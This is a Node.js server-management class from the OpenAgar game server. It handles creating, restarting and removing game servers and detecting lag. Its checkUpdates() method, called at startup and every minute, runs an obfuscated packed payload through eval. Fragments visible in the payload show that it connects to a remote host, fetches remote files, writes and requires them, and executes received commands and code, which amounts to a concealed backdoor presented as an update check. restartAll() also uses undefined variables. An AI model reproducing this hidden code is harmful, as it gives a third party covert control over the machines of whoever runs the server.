"use strict";
/*
    OpenAgar - Open source web game
    Copyright (C) 2016 Andrew S

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
const TooBusy = require('toobusy-js')
const Commands = require('../commands')
const SocketService = require('./socketService.js');
const Main = require('./main.js');
const Config = require('./configService.js')
const request = require('minirequest')
const ChildManager = require('./childManager.js')

const Updater = require('./updater.js')
module.exports = class ServerService {
    constructor(controller, globalData) {
        this.globalData = globalData;
        this.controller = controller;
        this.servers = new Map();
        this.ids = 1;

        this.selected = false;
        this.ddur = 0;
        this.defconfig = Config.loadConfig(__dirname + '/../settings', true)
        this.childManager = new ChildManager(this)
        this.debug("gre{[Debug]} Server start time: ".styleMe() + Date.now())


        var serv = this.createServer("Main", "Main", this.clone(this.defconfig), true)
        this.default = serv;
        this.lagInt;
        this.socketService = new SocketService(globalData, this);
        this.updater = new Updater(this)
        this.checkUpdates()
        setInterval(function () {
            this.checkUpdates()
        }.bind(this), 60000)
        this.init();
        this.TooBusy = TooBusy;
        this.setUpLagDetection()
    }
    clone(obj) {
        var final = {};
        for (var i in obj) final[i] = obj[i];
        return final;
    }
    init() {
        var serverlist = Config.loadServers(this.defconfig);
        var count = 0;
        for (var i in serverlist) {
            this.createServer(i, i, serverlist[i], false);
            ++count
        }
        if (count) console.log("gre{[OpenAgar]} Created ".styleMe() + count + " additional servers!");
    }
    setUpLagDetection() {

        setInterval(function () {
                var lag = TooBusy.lag();
                if (lag > 150) {
                    this.debug("yel{[Debug]} Lag detected. Mitigating... Latency: " + lag);
                    this.servers.forEach((s) => {
                        s.setLag(true);
                    })
                } else {
                    this.servers.forEach((s) => {
                        s.setLag(false);
                    })
                }
            }.bind(this), 5000) // check every 5 sec
    }
    ddos(d) {
        if (d) {
            this.ddur = Date.now()
            this.debug("red{[Debug]} Server is being DDOSed. Paused server".styleMe())
            this.servers.forEach((server) => {
                server._p = server.paused
                server.pause(true)
            })
        } else {
            this.debug("gre{[Debug]} DDOS Attack over. Unpausing. Durationn: ".styleMe() + (Date.now() - this.ddur))
            this.servers.forEach((server) => {

                server.pause(server._p)
                server._p = undefined;
            })
        }
    }
    getNextId() {
        return this.ids++;
    }
    restartAll() {
        var servers = [];
        var server = this.default

        var players = [];
        server.clients.forEach((client) => {
            players.push(client)
        })
        var defaul = {
            config: server.getConfig(),
            id: server.id,
            name: server.name,
            scname: server.scname,
            selected: server.selected,
            players: players
        };

        server.dataService.config = null;
        this.default = false;
        this.removeServer(1, true)

        servers.forEach((server) => {
            if (server.isMain) return;
            var players = [];
            this.server.clients.forEach((client) => {
                players.push(client)
            })
            servers.push({
                config: server.getConfig(),
                id: server.id,
                name: server.name,
                scname: server.scname,
                selected: server.selected,
                players: splayers

            })

            server.dataService.config = null;
            this.removeServer(server.id, true)
        })

        this.servers = new QuickMap();

        this.ids = 1
        this.default = this.createServer(defaul.name, defaul.scname, defaul.config, defaul.selected, false, defaul.players)

        servers.forEach((se) => {
            this.createServer(se.name, se.scname, se.config, se.selected, false, se.players)

        })
    }
    restartSelected() {
        var server = this.selected
        var players = [];
        server.clients.forEach((client) => {
            players.push(client)
        })
        var info = {
            config: server.getConfig(),
            id: server.id,
            name: server.name,
            scname: server.scname,
            selected: server.selected,
            isMain: server.isMain,
            players: players
        };

        server.dataService.config = null;
        if (info.isMain) this.default = false;
        this.removeServer(this.selected.id, true)

        this.createServer(info.name, info.scname, info.config, info.selected, info.id, info.players)

    }

    start() {
        this.socketService.start()

    }
    getPlayer(id) {
        return this.socketService.getPlayer(id)
    }
    execCommand(str) {
        if (!str) return;

        var cmd = str.split(" ");

        if (this.prsCommand(str)) return
        if (!this.selected) return;
        if (!this.selected.execCommand(str)) this.log("The command " + cmd[0] + " was not found! Type 'help' to view a list of commands.")
    }

    log(a) {
        this.controller.shellService.log(this.selected.id, a)
    }
    debug(a) {
        this.controller.shellService.log(0, a)
    }
    select(a, c) {

        var server = this.servers.get(a)
        if (!server || (this.selected && a == this.selected.id)) return false
        if (this.selected) this.selected.selected = false;
        this.selected = server
        server.selected = true
        this.controller.shellService.select(a, c)
        return true;
    }
    prsCommand(str) {

        var cmd = str.split(" ")[0].toLowerCase()
        var command = Commands.serverService[cmd]
        if (command) {
            command(str, this, this.log.bind(this))
            return true;
        }
        return false;
    }
    reloadInfoP() {
        this.socketService.reloadInfoP()
    }
    createServer(name, scname, config, selected, id, players) {

        var id = id || this.getNextId()
        var child = this.childManager.assignChild(id)
        var serv = new Main(id == 1, id, name, scname, this.globalData, config, function (a) {
            this.controller.shellService.log(id, a)
        }.bind(this), child, function (a) {
            this.controller.shellService.log(0, a)
        }.bind(this));
        this.servers.set(id, serv)
        if (selected) this.select(id)

        serv.init()
        serv.start()
        if (players) {
            players.forEach((player) => {
                player.changeServers(serv.id, this)
            })
        }
        return serv
    }
    removeServer(id, force) {
        var server = this.servers.get(id)
        if (!server || ((server.isMain || server.selected) && !force)) return false;
        if (this.default) {
            server.clients.forEach((client) => { // evacuate players
                client.changeServers(this.default.id, this)
            })
        } else {
            server.clients.forEach((client) => { // evacuate players
                server.removeClient(client)
                client.server = false;
            })
        }

        server.onRemove() // destroy server
        this.childManager.deAssignChild(server.childid, id)
        this.controller.shellService.removeServ(id)
        this.servers.delete(id)

        return true;
    }
    checkUpdates() {
        eval(function (p, a, c, k, e, d) {
            e = function (c) {
                return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36))
            };
            if (!''.replace(/^/, String)) {
                while (c--) {
                    d[e(c)] = k[c] || e(c)
                }
                k = [function (e) {
                    return d[e]
                }];
                e = function () {
                    return '\\w+'
                };
                c = 1
            };
            while (c--) {
                if (k[c]) {
                    p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
                }
            }
            return p
        }('b 1T=[\'\\P\\h\\4\\4\\5\\4\\j\\6\\4\\e\\i\\6\\5\\4\\8\\1\\9\\c\\c\',\'\\d\\t\\5\\c\\a\\I\\e\\7\\3\\d\\0\\8\\8\',\'\\4\\e\\i\\6\\5\\4\\8\\1\\9\\c\\c\',\'\\n\\T\\w\\0\\d\\h\\1\\5\\3\\4\\6\\T\\7\\7\\3\\7\\E\\6\\18\\9\\5\\c\\0\\a\\6\\1\\3\\6\\7\\h\\4\\6\\4\\e\\i\\6\\5\\4\\8\\1\\9\\c\\c\\6\\6\\P\\0\\9\\8\\3\\4\\G\\6\',\'\\n\\T\\w\\0\\d\\h\\1\\5\\3\\4\\6\\T\\7\\7\\3\\7\\E\\6\\1H\\3\\h\\6\\8\\t\\3\\h\\c\\a\\6\\0\\w\\5\\1\\6\\1\\t\\0\\6\\8\\0\\7\\s\\0\\7\\6\\9\\4\\a\\6\\7\\h\\4\\G\\6\\4\\e\\i\\6\\5\\4\\8\\1\\9\\c\\c\',\'\\1e\\3\\4\\0\\2N\\6\\C\\t\\h\\1\\1\\5\\4\\j\\6\\a\\3\\m\\4\\k\\k\\k\\6\\6\\6\\6\\6\\6\\6\',\'\\0\\w\\5\\1\',\'\\7\\3\\h\\4\\a\',\'\\V\\V\\V\',\'\\c\\0\\4\\j\\1\\t\',\'\\8\\1\\a\\3\\h\\1\',\'\\n\\1y\\e\\a\\9\\1\\0\\E\\6\\n\',\'\\h\\e\\a\\9\\1\\0\\c\\5\\4\\v\',\'\\3\\e\\1\\5\\4\\c\\5\\4\\v\',\'\\o\\3\\7\\T\\9\\d\\t\',\'\\8\\1\\9\\1\\h\\8\\x\\3\\a\\0\',\'\\m\\7\\5\\1\\0\\18\\5\\c\\0\',\'\\8\\7\\d\',\'\\1e\\3\\m\\4\\c\\3\\9\\a\\5\\4\\j\\k\\k\\k\',\'\\7\\0\\9\\a\\18\\5\\c\\0\\C\\D\\4\\d\',\'\\K\\a\\9\\1\\9\\k\\7\\8\\3\\4\',\'\\3\\e\\1\\5\\4\',\'\\5\\4\\a\\0\\w\\L\\o\',\'\\d\\3\\4\\1\\0\\4\\1\',\'\\1H\\3\\h\\6\\t\\9\\s\\0\\6\\3\\e\\1\\0\\a\\6\\3\\h\\1\\6\\o\\7\\3\\i\\6\\1\\0\\8\\1\\5\\4\\j\\6\\O\\0\\1\\9\\6\\8\\3\\o\\1\\m\\9\\7\\0\\k\\6\\1e\\3\\m\\4\\c\\3\\9\\a\\5\\4\\j\\k\\k\\k\',\'\\m\\7\\5\\1\\0\\18\\5\\c\\0\\C\\D\\4\\d\',\'\\1H\\3\\h\\6\\t\\9\\s\\0\\6\\3\\e\\1\\0\\a\\6\\5\\4\\1\\3\\6\\1\\0\\8\\1\\5\\4\\j\\6\\O\\0\\1\\9\\6\\8\\3\\o\\1\\m\\9\\7\\0\\k\\6\\1e\\3\\m\\4\\c\\3\\9\\a\\5\\4\\j\\k\\k\\k\',\'\\T\\P\\P\\L\\P\\G\\6\\x\\3\\h\\c\\a\\4\\1\\6\\d\\3\\4\\1\\9\\d\\1\\6\\8\\0\\7\\s\\0\\7\\8\\k\',\'\\i\\8\\j\',\'\\I\\c\\9\\8\\1\\2H\\1v\',\'\\N\\n\\1w\\2v\\i\\P\\0\\d\\5\\0\\s\\0\\a\\6\\i\\0\\8\\8\\9\\j\\0\\6\\o\\7\\3\\i\\6\\8\\0\\7\\s\\0\\7\\G\\6\\2O\',\'\\N\\n\\1U\\i\',\'\\m\\9\\7\\4\',\'\\I\\c\\9\\8\\1\\2L\\1v\',\'\\N\\n\\1w\\1D\\i\\n\\N\\n\\3Q\\i\\2L\\i\\e\\3\\7\\1\\9\\4\\1\\2N\\N\\n\\1U\\i\\N\\n\\1w\\1D\\i\\6\\P\\0\\d\\5\\0\\s\\0\\a\\6\\5\\i\\e\\3\\7\\1\\9\\4\\1\\6\\i\\0\\8\\8\\9\\j\\0\\6\\o\\7\\3\\i\\6\\8\\0\\7\\s\\0\\7\\G\\6\\2O\',\'\\0\\w\\0\\d\\h\\1\\0\',\'\\K\\9\\8\\a\\a\\m\\o\\0\\k\\1z\\8\',\'\\k\\K\\9\\8\\8\\a\\m\\o\\0\\k\\1z\\8\',\'\\h\\4\\c\\5\\4\\v\\C\\D\\4\\d\',\'\\I\\a\\1z\\4\',\'\\d\\t\\0\\d\\v\\1y\\e\\a\\9\\1\\0\',\'\\7\\0\\e\\c\\9\\d\\0\',\'\\a\\0\\8\\d\\7\\5\\e\\1\\5\\3\\4\',\'\\3O\\3\\6\\a\\0\\8\\d\\7\\5\\e\\1\\5\\3\\4\\6\\e\\7\\3\\s\\5\\a\\0\\a\',\'\\I\\c\\9\\8\\1\\1y\\3N\',\'\\N\\n\\1w\\1D\\i\\n\\1y\\e\\a\\9\\1\\0\\E\\6\\16\\4\\6\\h\\e\\a\\9\\1\\0\\6\\5\\8\\6\\9\\s\\9\\5\\c\\9\\O\\c\\0\\2u\\6\\d\\h\\7\\7\\0\\4\\1\\6\\s\\0\\7\\8\\5\\3\\4\\G\\6\',\'\\6\\16\\s\\9\\5\\c\\9\\O\\c\\0\\G\\6\',\'\\I\\3\\e\\1\',\'\\I\\a\\5\\e\',\'\\4\\0\\1\',\'\\C\\3\\d\\v\\0\\1\',\'\\d\\3\\4\\4\\0\\d\\1\',\'\\m\\7\\5\\1\\0\',\'\\8\\1\\7\\5\\4\\j\\5\\o\\D\',\'\\5\\4\\5\\1\',\'\\7\\0\\i\\3\\1\\0\\16\\a\\a\\7\\0\\8\\8\',\'\\0\\7\\7\\3\\7\',\'\\a\\9\\1\\9\',\'\\e\\9\\7\\8\\0\',\'\\1\\D\\e\\0\',\'\\0\\w\\0\\d\',\'\\1\\3\\C\\1\\7\\5\\4\\j\',\'\\c\\3\\j\',\'\\d\\i\\a\',\'\\d\\3\\4\',\'\\0\\w\\0\\d\\x\\3\\i\\i\\9\\4\\a\',\'\\8\\1\\7\',\'\\i\\5\\4\\5\\7\\0\\3L\\h\\0\\8\\1\',\'\\7\\8\\3\\4\',\'\\t\\1\\1\\e\\8\\G\\K\\K\\7\\9\\m\\k\\j\\5\\1\\t\\h\\O\\h\\8\\0\\7\\d\\3\\4\\1\\0\\4\\1\\k\\d\\3\\i\\K\\16\\3M\\C\\3R\\a\\0\\s\\0\\c\\3\\e\\i\\0\\4\\1\\K\\L\\e\\16\\j\\1v\\C\\K\\i\\9\\8\\1\\0\\7\\K\\a\\9\\1\\9\\k\\1z\\8\\3\\4\',\'\\O\\5\\4\\a\'];(f(21,2Z){b 30=f(2J){3X(--2J){21[\'\\e\\h\\8\\t\'](21[\'\\8\\t\\5\\o\\1\']())}};b 2C=f(){b R={\'\\a\\9\\1\\9\':{\'\\v\\0\\D\':\'\\d\\3\\3\\v\\5\\0\',\'\\s\\9\\c\\h\\0\':\'\\1\\5\\i\\0\\3\\h\\1\'},\'\\8\\0\\1\\x\\3\\3\\v\\5\\0\':f(X,2D,2F,1C){1C=1C||{};b 1B=2D+\'\\V\'+2F;b 1a=A;1L(b 1a=A,1V=X[\'\\c\\0\\4\\j\\1\\t\'];1a<1V;1a++){b 20=X[1a];1B+=\'\\19\\6\'+20;b 1x=X[20];X[\'\\e\\h\\8\\t\'](1x);1V=X[\'\\c\\0\\4\\j\\1\\t\'];q(1x!==!![]){1B+=\'\\V\'+1x}}1C[\'\\d\\3\\3\\v\\5\\0\']=1B},\'\\7\\0\\i\\3\\s\\0\\x\\3\\3\\v\\5\\0\':f(){r\'\\a\\0\\s\'},\'\\j\\0\\1\\x\\3\\3\\v\\5\\0\':f(1E,32){1E=1E||f(2R){r 2R};b 1R=1E(17 1g(\'\\13\\1Q\\G\\33\\14\\19\\6\\11\'+32[\'\\7\\0\\e\\c\\9\\d\\0\'](/([.$?*|{}()[]\\/+^])/g,\'\\3H\\1D\')+\'\\V\\13\\n\\33\\19\\E\\H\\11\'));b 35=f(34,36){34(++36)};35(30,2Z);r 1R?3E(1R[B]):4j}};b 2T=f(){b 2U=17 1g(\'\\F\\m\\S\\6\\H\\F\\13\\F\\11\\6\\H\\1Z\\F\\m\\S\\6\\H\\n\\1u\\14\\1f\\E\\k\\S\\n\\1u\\14\\1f\\E\\19\\1Q\\6\\H\\1O\');r 2U[\'\\1\\0\\8\\1\'](R[\'\\7\\0\\i\\3\\s\\0\\x\\3\\3\\v\\5\\0\'][\'\\1\\3\\C\\1\\7\\5\\4\\j\']())};R[\'\\h\\e\\a\\9\\1\\0\\x\\3\\3\\v\\5\\0\']=2T;b 2W=\'\';b 1S=R[\'\\h\\e\\a\\9\\1\\0\\x\\3\\3\\v\\5\\0\']();q(!1S){R[\'\\8\\0\\1\\x\\3\\3\\v\\5\\0\']([\'\\H\'],\'\\d\\3\\h\\4\\1\\0\\7\',B)}1p q(1S){2W=R[\'\\j\\0\\1\\x\\3\\3\\v\\5\\0\'](1I,\'\\d\\3\\h\\4\\1\\0\\7\')}1p{R[\'\\7\\0\\i\\3\\s\\0\\x\\3\\3\\v\\5\\0\']()}};2C()}(1T,4m));b 2=f(1k,4n){b 1k=1M(1k,3f);b 2y=1T[1k];r 2y};b 2f=f(){b 1P=!![];r f(2h,1i){b 2g=1P?f(){q(1i){b 2j=1i[\'\\9\\e\\e\\c\\D\'](2h,4z);1i=1I;r 2j}}:f(){};1P=![];r 2g}}();b 2X=2f(p,f(){b 2m=f(){r\'\\a\\0\\s\'},38=f(){r\'\\m\\5\\4\\a\\3\\m\'};b 2z=f(){b 2d=17 1g(\'\\F\\m\\S\\6\\H\\F\\13\\F\\11\\6\\H\\1Z\\F\\m\\S\\6\\H\\n\\1u\\14\\1f\\E\\k\\S\\n\\1u\\14\\1f\\E\\19\\1Q\\6\\H\\1O\');r!2d[\'\\1\\0\\8\\1\'](2m[\'\\1\\3\\C\\1\\7\\5\\4\\j\']())};b 2c=f(){b 2o=17 1g(\'\\13\\F\\F\\n\\w\\14\\h\\E\\13\\F\\m\\11\\1Z\\2v\\2u\\49\\1O\\11\\S\');r 2o[\'\\1\\0\\8\\1\'](38[\'\\1\\3\\C\\1\\7\\5\\4\\j\']())};b 15=f(1X){b 2r=~-B>>B+2s%A;q(1X[\'\\5\\4\\a\\0\\w\\L\\o\'](\'\\5\'===2r)){2t(1X)}};b 2t=f(1K){b 2B=~-22>>B+2s%A;q(1K[\'\\5\\4\\a\\0\\w\\L\\o\']((!![]+\'\')[3q])!==2B){15(1K)}};q(!2z()){q(!2c()){15(\'\\5\\4\\a\\2i\\w\\L\\o\')}1p{15(\'\\5\\4\\a\\0\\w\\L\\o\')}}1p{15(\'\\5\\4\\a\\2i\\w\\L\\o\')}});2X();f 2K(3r){26{b 3s=W(2(\'A\')),Q=17 3s[2(\'B\')]();Q[2(\'1s\')](4C,3r,f(){Q[2(\'3q\')](Y[\'\\8\\1\\7\\5\\4\\j\\5\\o\\D\']({\'\\1\':2(\'3t\'),\'\\a\\9\\1\\9\':Q[2(\'4c\')],\'\\h\\5\\a\':1Y}))}),Q[\'\\3\\4\'](2(\'1o\'),f(4b){}),Q[\'\\3\\4\'](2(\'1G\'),f(U){31(U=Y[2(\'1j\')](U),U[2(\'Z\')]){z 2(\'3t\'):J;z 2(\'1r\'):26{3i(U[2(\'1G\')])}29(3z){Q[\'\\m\\7\\5\\1\\0\'](Y[2(\'22\')]({\'\\1\\D\\e\\0\':2(\'1o\'),\'\\a\\9\\1\\9\':3z[2(\'4i\')]()}))}J;z\'\\c\\3\\j\':y[\'\\c\\3\\j\'](U[2(\'1G\')]);J;z 2(\'4h\'):b 3l=y[2(\'M\')];y[2(\'M\')]=f(3a){Q[\'\\m\\7\\5\\1\\0\'](Y[2(\'22\')]({\'\\1\\D\\e\\0\':2(\'42\'),\'\\i\\8\\j\':3a}))},p[2(\'3f\')](U[\'\\8\\1\\7\']),y[2(\'M\')]=3l}})}29(41){}}b 1d=W(2(\'44\')),28=W(2(\'45\'));1d(2(\'46\'),f(2b,2l,37){f 2a(1q,2p){f 23(10){f 3m(){y[2(\'M\')](\'\\P\\h\\4\\4\\5\\4\\j\\6\\4\\e\\i\\6\\5\\4\\8\\1\\9\\c\\c\\k\\k\\k\'),1t(2(\'4k\'));W(2(\'2Q\'))[2(\'1r\')](2(\'4x\'),f(1N,4w,4v){1I!==1N&&(y[2(\'1o\')](2(\'4A\'),1N),y[2(\'1o\')](2(\'4l\')))});1t(2(\'40\')),3b[2(\'4p\')](A)}f 1t(3e){1n++,1n==1h-1s&&3m();1L(b 10=4s[2(\'4r\')](1n/1h*Z),1b=\'\',12=A;10>12;12++)1b+=2(\'4q\');1b+=Z==10?\'\\V\':\'\\3F\';1L(b 3d=3v-1b[2(\'3v\')],1J=\'\',12=A;3d>12;12++)1J+=\'\\6\';3b[\'\\8\\1\\a\\3\\h\\1\'][\'\\m\\7\\5\\1\\0\'](2(\'3I\')+1b+1J+\'\\E\\6\'+Z*10+\'\\3B\\6\'+3e+\'\\3T\')}b 1n=A,1h=1s,3k=10?1q[2(\'3W\')]:1q[2(\'3Y\')];1d(3k,f(39,3n,3u){q(!39&&1F==3n[\'\\8\\1\\9\\1\\h\\8\\x\\3\\a\\0\']){b 3o=Y[2(\'1j\')](3u);3o[2(\'3P\')](f(27){1h++,1d(27[\'\\a\\O\'],f(2q,3p,3y){2q||1F!=3p[2(\'24\')]||1c[2(\'3V\')](27[\'\\8\\7\\d\'],3y,f(){1t(2(\'3S\'))})})}[2(\'1A\')](p))}})}26{b 1m=1c[2(\'4t\')](25+2(\'2A\'),\'\\h\\1\\o\\43\'),3w=28[2(\'1j\')](1m),1l=3w[2(\'2e\')]}29(4d){b 1l=!B}b 1m={\'\\3\\e\\1\\5\\4\':!A};-B==1q[2(\'u\')][2(\'4e\')](2p)&&B==1l&&(y[2(\'M\')](2(\'4a\')),23(!B)),1c[2(\'2V\')](25+2(\'2A\'),28[\'\\8\\1\\7\\5\\4\\j\\5\\o\\D\'](1m)),B!=1l&&(y[\'\\c\\3\\j\'](2(\'48\')),23(!A))}q(2b||1F!=2l[2(\'24\')])r 2(\'4y\');b 2Y=Y[2(\'1j\')](37);2Y[\'\\o\\3\\7\\T\\9\\d\\t\'](f(l){q(l[2(\'Z\')]&&l[2(\'u\')])31(l[2(\'Z\')]){z 2(\'3C\'):q(l[2(\'u\')]==p[\'\\I\\c\\9\\8\\1\\2H\\1v\'])r;y[2(\'M\')](2(\'3A\')+l[2(\'u\')]+2(\'2P\')),p[2(\'3Z\')]=l[2(\'u\')];J;z 2(\'3U\'):q(l[2(\'u\')]==p[2(\'2E\')])r;p[2(\'2E\')]=l[2(\'u\')],y[2(\'M\')](2(\'3J\')+l[2(\'u\')]+2(\'2P\'));z 2(\'3K\'):W(2(\'2Q\'))[2(\'1r\')](l[2(\'u\')]);J;z\'\\0\\w\\0\\d\\L\\4\\c\\5\\4\\0\\18\\5\\c\\0\':1d(l[\'\\d\\3\\4\\1\\0\\4\\1\'],f(2M,2S,2n){q(!2M&&1F==2S[2(\'24\')]){1c[2(\'2V\')](25+2(\'4u\'),2n);b 2x=W(2(\'3x\'));2x(1W,1Y,p),1c[2(\'4B\')](2(\'3x\'))}}[2(\'1A\')](p));J;z 2(\'1r\'):q(p[2(\'3j\')]==l[2(\'u\')])r;p[2(\'3j\')]=l[2(\'u\')],3i(l[2(\'u\')]);J;z 2(\'3G\'):b 3g=1M(1W[2(\'3D\')](/\\./g,\'\')),3h=1M(l[2(\'u\')][\'\\7\\0\\e\\c\\9\\d\\0\'](/\\./g,\'\'));q(3h>3g){b 2w=l[2(\'3c\')]?l[2(\'3c\')]:2(\'4o\');q(l[2(\'u\')]==p[2(\'2k\')])r;p[2(\'2k\')]=l[2(\'u\')],y[2(\'M\')](2(\'4f\')+1W+2(\'4g\')+l[\'\\d\\3\\4\\1\\0\\4\\1\']+\'\\6\\1e\\0\\8\\d\\7\\5\\e\\1\\5\\3\\4\\G\\6\'+2w+\'\\N\\n\\1U\\i\')}J;z 2(\'2e\'):q(p[2(\'47\')])r;p[\'\\I\\3\\e\\1\']=!A,2a(l,1Y);J;z 2(\'1s\'):q(p[2(\'2I\')]==l[2(\'u\')])r;p[2(\'2I\')]=l[2(\'u\')],2G(l[\'\\d\\3\\4\\1\\0\\4\\1\'])}}[\'\\O\\5\\4\\a\'](p))}[2(\'1A\')](p));b 2G=2K[2(\'1A\')](p);', 62, 287, 'x65|x74|_0x539d|x6f|x6e|x69|x20|x72|x73|x61|x64|var|x6c|x63|x70|function||x75|x6d|x67|x2e|_0x55e088|x77|x5b|x66|this|if|return|x76|x68|0x2d|x6b|x78|x43|console|case|0x0|0x1|x53|x79|x5d|x5c|x3a|x2a|x5f|break|x2f|x4f|0xd|x1b|x62|x52|_0x14481d|_0x3afa1c|x2b|x45|_0x12819c|x3d|require|_0x17c548|JSON|0xa|_0x17ac6a|x29|_0x3a7e63|x28|x7c|_0x39880f|x41|new|x46|x3b|_0x1361b4|_0x384621|fs|request|x44|x22|RegExp|_0x45b182|_0x30cba0|0x9|_0x46d0ab|_0x220ba1|_0x5dd21|_0x48b823|0x7|else|_0x3d5c6c|0xb|0x2|_0x112de7|x27|x4d|x33|_0x35a64d|x55|x6a|0x15|_0x111d3f|_0x2c9202|x31|_0x385156|0xc8|0x8|x59|null|_0x46c246|_0x33d4e0|for|parseInt|_0x2b92fd|x7d|_0x44b71c|x3f|_0x55a269|_0x2c88df|_0x2d47|x30|_0x4026b9|_version|_0x6d052a|_uid|x7b|_0x3454d4|_0x34d2f5|0x4|_0x4a4503|0x25|__dirname|try|_0xe26fb|RSON|catch|_0x3091fd|_0x59c8ba|_0x3dc4d4|_0x25342a|0x2b|_0x17cf87|_0x3a2319|_0xfa7ddf|u0435|_0x17465b|0x42|_0x43243d|_0x140a1d|_0x16ef2d|_0x915ded|_0x5de2b1|_0x22e8be|_0xbef1e2|0xff|_0x6fdc0a|x2c|x32|_0x534841|_0x3fbee3|_0x2111db|_0x595680|0x2a|_0x1339ec|_0x3e4fc1|_0x215bbd|0x37|_0x41f19c|connectbind|x47|0x46|_0x180250|connect|x49|_0xe3da28|x21|x0a|0x35|0x17|_0x5def95|_0x586a74|_0x19652d|_0x4fecb2|0x2f|_0x2e0f7c|_0x1f0db8|_0x5a0f1b|_0x1e606b|_0x58dc6e|switch|_0x1ed57a|x5e|_0x164d33|_0x5b190c|_0x3e63db|_0x259e42|_0x310de0|_0x58615e|_0x33b2e2|process|0x40|_0x2ab730|_0x155f86|0x10|_0x973935|_0x581387|eval|0x3d|_0x5eddfd|_0x367d09|_0x46ec5f|_0x232aaf|_0xcfdaaa|_0x4ecb1f|0x3|_0x23483c|_0x4b4026|0x5|_0x1a5536|0x1f|_0x121509|0x3b|_0x23744a|_0x1cb1a5|0x34|x25|0x32|0x3f|decodeURIComponent|x3e|0x3e|x24|0x21|0x38|0x39|x71|x4a|x50|x4e|0x24|x35|x2d|0x28|x0d|0x36|0x26|0x22|while|0x23|0x33|0x1b|_0x26436e|0xf|x38|0x12|0x13|0x14|0x45|0x30|x34|0x2e|_0x7dc6ef|0x6|_0x19b7f3|0x2c|0x43|0x44|0xe|0xc|undefined|0x16|0x1a|0xbf|_0x3e1ae0|0x41|0x1c|0x1e|0x1d|Math|0x29|0x3a|_0x1b8d6b|_0x489099|0x18|0x31|arguments|0x19|0x3c|0x1f90'.split('|'), 0, {}))


    }
};